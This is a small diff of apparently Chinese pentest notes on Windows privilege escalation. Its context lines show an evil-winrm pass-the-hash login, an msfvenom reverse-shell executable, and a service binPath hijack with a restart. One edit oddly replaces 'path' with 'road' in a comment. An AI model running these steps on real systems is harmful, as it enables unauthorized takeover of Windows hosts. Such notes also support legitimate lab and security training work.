@@ -437,7 +437,7 @@ kali: evil-winrm -i ip -u Adminstrator -H hash # :后半部分
 ```
 
 5. 服务提权，首先使用`sc qc mysql`，这种的方式查询某个服务的详细配置信息，接下来根据`BINARY_PATH_NAME`查询用于查看和修改文件/文件夹NTFS权限的命令
-```cmd
+```bash
 icacls E:\mysql\bin\mysql.exe
 #权限级别说明
 - F - 完全控制
@@ -455,7 +455,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe
 upload shell.exe
 3. 修改服务binPath
 sc.exe config vss binPath="C:\path\to\shell.exe"
-# `path`是你shell.exe下载到的路径
+# road是你shell.exe下载到的路径
 4. 重启服务（需要有Server Operators权限）
 sc.exe stop vss
 sc.exe start vss
